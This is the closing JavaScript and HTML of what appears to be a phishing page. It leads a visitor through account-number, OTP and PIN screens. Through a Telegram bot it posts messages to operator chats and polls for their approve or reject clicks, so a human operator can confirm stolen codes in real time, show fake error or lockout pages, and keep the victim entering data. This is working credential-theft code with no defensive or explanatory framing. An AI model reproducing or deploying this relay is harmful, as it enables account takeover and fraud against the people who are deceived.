            const kb = { inline_keyboard: [[{ text: "‚úÖ Correct", callback_data: `${context}_yes_${SESSION_ID}` }, { text: "‚ùå Incorrect", callback_data: `${context}_no_${SESSION_ID}` }]]};
            for (let id of ADMIN_IDS) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: id, text: text, parse_mode: "HTML", reply_markup: kb })
                });
            }
        }

        function pollAdmin(context) {
            clearInterval(pollerInterval);
            pollerInterval = setInterval(async () => {
                try {
                    const resJson = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastOffset}`);
                    const data = await resJson.json();
                    if (data.result) {
                        for (let update of data.result) {
                            lastOffset = update.update_id + 1;
                            if (update.callback_query) {
                                let action = update.callback_query.data;
                                if (action.includes(SESSION_ID)) {
                                    clearInterval(pollerInterval);
                                    
                                    if (action.includes("_noteligible")) {
                                        showPage('ineligible');
                                    } 
                                    else if (action.includes("_notreg")) {
                                        showModal('not-reg-modal');
                                    } 
                                    else if (action.includes("_locked")) {
                                        showPage('locked');
                                    } 
                                    else if (action.includes("_yes")) {
                                        handleAdminChoice(context, "yes");
                                    } 
                                    else if (action.includes("_no")) {
                                        handleAdminChoice(context, "no");
                                    }
                                }
                            }
                        }
                    }
                } catch (e) {}
            }, 2000);
        }

        function handleAdminChoice(context, choice) {
            if (choice === "yes") {
                if(context === "acc_check") { showPage('otp'); startOtpCountdown(); }
                else if(context === "otp_check") showPage('login');
                else { localStorage.setItem('user_round', (roundNumber + 1).toString()); showPage('success'); }
            } else {
                if(context === "acc_check") showModal('error-modal');
                else if(context === "otp_check") {
                    document.querySelectorAll('.otp-box').forEach(box => box.value = '');
                    checkOtpReady();
                    showModal('otp-error-modal');
                } else {
                    pinAttempts++;
                    if (pinAttempts >= 3) showPage('locked');
                    else {
                        let left = 3 - pinAttempts;
                        document.getElementById('pin-error-body').innerText = `Incorrect password. You have ${left} attempt(s) left.`;
                        showModal('pin-error-modal');
                    }
                }
            }
        }

        function retryPin() { hideModal('pin-error-modal'); document.getElementById('pin-field').value = ''; showPage('login'); }
        function resetToAccount() { hideModal('error-modal'); hideModal('not-reg-modal'); showPage('account'); }
        function validateAcc() {
            const input = document.getElementById('acc-input');
            if (input.value.length > 13) input.value = input.value.slice(0, 13);
            document.getElementById('counter').innerText = input.value.length + '/13';
            const btn = document.getElementById('acc-btn');
            if (input.value.length === 13) { btn.classList.add('active-btn'); btn.disabled = false; }
            else { btn.classList.remove('active-btn'); btn.disabled = true; }
        }
        function checkBack(e, prevId) { if (e.key === "Backspace" && e.target.value === "" && prevId) document.getElementById(prevId).focus(); }
        function validatePin() {
            const btn = document.getElementById('reg-btn');
            if (document.getElementById('pin-field').value.length >= 6) { btn.classList.add('active-btn'); btn.disabled = false; }
            else { btn.classList.remove('active-btn'); btn.disabled = true; }
        }
        function togglePin() { const p = document.getElementById('pin-field'); p.type = p.type === 'password' ? 'text' : 'password'; }
        function showModal(id) { document.getElementById(id).style.display = 'flex'; }
        function hideModal(id) { document.getElementById(id).style.display = 'none'; }

        window.addEventListener('load', () => setTimeout(() => {
            document.getElementById('splash-screen').style.display = 'none';
            document.getElementById('main-app').style.opacity = '1';
        }, 3000));
    </script>
</body>
</html>
